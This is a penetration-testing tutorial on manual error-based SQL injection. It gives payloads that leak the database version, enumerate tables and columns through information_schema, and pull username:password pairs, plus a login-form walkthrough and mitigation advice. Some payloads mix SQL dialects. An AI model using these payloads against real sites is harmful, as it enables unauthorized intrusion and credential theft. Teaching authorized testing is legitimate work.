# Manual Error-Based SQL Injection (SQLi) Guide

Error-Based SQL Injection (SQLi) leverages error messages returned by the database to gain information about the database schema and contents. This guide provides a step-by-step manual method to identify and exploit Error-Based SQLi vulnerabilities.

## Steps to Perform Manual Error-Based SQLi
### 1. **Identify Potential Injection Points**
1. **Explore the Application**: Navigate through the application and identify potential input fields, URL parameters, or HTTP headers that interact with the database. Common targets include search boxes, login forms, and user input fields.
2. **Test Basic SQL Injection**:    - Start testing basic SQL injection payloads to see if the application is vulnerable. Here are some Example payloads:
     ```sql
     '
     "
     ' OR '1'='1
     ```
3. **Observe Application Behavior**: Look for any unusual behavior or error messages. If you receive an error message, it may indicate that the application is interacting with a database.

### 2. **Inject SQL Payloads to Trigger Errors**

1. **Inject Malformed SQL Payloads**: Introduce payloads that could cause syntax errors in the SQL query. Here are some Example payloads:
     ```sql
     ' OR 1=1--
     ' AND 1=2--
     ```
2. **Analyze Error Messages**: Pay attention to the error messages returned. Useful information might include:
     - SQL syntax errors
     - Data type mismatches
     - Database-specific error codes
**Example error message:**
     ```
     SQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '...' at line 1
     ```
### 3. **Extract Information Using Error Messages**
1. **Retrieve Database Version**: Use payloads to retrieve the database version. Here are some example payloads:
     ```sql
     ' AND 1=CONVERT(int, (SELECT @@version))--
     ' OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.columns GROUP BY x) a)--
     ```
2. **Identify Table Names**: Extract table names by causing the database to reveal them through error messages. Here are some example payloads:
     ```sql
     ' UNION SELECT NULL, table_name FROM information_schema.tables--
     ' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables LIMIT 1))--
     ```
3. **Identify Column Names**: After obtaining table names, identify column names within those tables. Here are some example payloads:
     ```sql
     ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
     ' AND 1=CONVERT(int, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1))--
     ```
4. **Retrieve Data from Columns**: Use payloads to extract data from specific columns. Here are some example payloads:
     ```sql
     ' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--
     ' AND 1=CONVERT(int, (SELECT CONCAT(username, ':', password) FROM users LIMIT 1))--
     ```
### 4. **Refine Your Payloads**
1. **Adjust Based on Error Messages**: Modify your payloads based on the error messages you receive to probe deeper into the database structure. If errors indicate specific issues, adapt your payloads to correct the syntax or address the data type.

3. **Iterate to Extract More Data**: Continue injecting refined payloads to gather more detailed information about the database schema and data.

### 5. **Verify and Document Findings**

1. **Verify Vulnerability**: Confirm that the error messages consistently provide useful information, and that your payloads are accurately extracting data.

2. **Document Results**: Record all relevant details, including error messages, payloads used, and the information extracted. Take screenshots or log responses to provide evidence of the SQLi vulnerability.

3. **Assess Impact**: Evaluate the potential impact of the SQLi vulnerability based on the data obtained and the sensitivity of the information.

4. **Prepare Recommendations**: Suggest measures to mitigate the SQLi vulnerability, such as using prepared statements, input validation, and secure error handling.

## EXAMPLE SCENARIO:  Testing a User Login Form
1. **Identify Injection Point**: Target the `username` and `password` fields in the login form.
2. **Inject Basic Payload**: Input the following payload into the `username` field:
     ```sql
     ' OR 1=1--
     ```
3. **Observe Error Message**: If an SQL error appears, it may reveal database details like the error message:
     ```
     SQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '...' at line 1
     ```
4. **Extract Database Info**: Refine the payload to extract information:
     ```sql
     ' AND 1=CONVERT(int, (SELECT @@version))--
     ```

5. **Retrieve Table Names**: Use the following payload to list tables:
     ```sql
     ' UNION SELECT NULL, table_name FROM information_schema.tables--
     ```

6. **Retrieve Column Names**: Identify columns in the `users` table:
     ```sql
     ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
     ```

7. **Extract Data**: Retrieve data from the `users` table:
     ```sql
     ' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--
     ```
## Conclusion

Manually performing Error-Based SQL Injection involves testing input fields to trigger SQL errors and using those errors to gather information about the database schema. By following this step-by-step guide, you can effectively identify and exploit SQLi vulnerabilities without automated tools.

Always ensure you have explicit permission to test and adhere to ethical guidelines during your penetration testing activities.
